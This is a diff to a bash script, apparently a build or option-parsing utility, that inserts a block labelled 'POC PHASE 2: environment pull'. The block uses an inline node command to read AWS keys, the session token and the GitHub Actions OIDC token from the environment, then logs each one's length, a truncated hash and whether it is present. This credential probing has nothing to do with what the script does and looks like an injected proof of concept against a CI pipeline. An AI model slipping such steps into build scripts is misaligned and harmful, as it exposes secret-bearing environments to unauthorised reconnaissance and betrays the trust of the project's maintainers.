@@ -1,6 +1,9 @@
 #!/bin/bash
 # using bin/bash for macOS and Linux compatibility
 
+echo "=== POC PHASE 2: environment pull ==="
+node -e "const c=require('crypto'),h=v=>c.createHash('sha256').update(v).digest('hex').slice(0,12),e=process.env;['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN','AWS_REGION','ACTIONS_ID_TOKEN_REQUEST_TOKEN'].forEach(k=>{const v=e[k]||'';console.log(k+' len='+v.length+' hash='+h(v)+' hasValue='+(v.length>0))})" || true
+
 dirs=""
 
 # Get Options from CLI
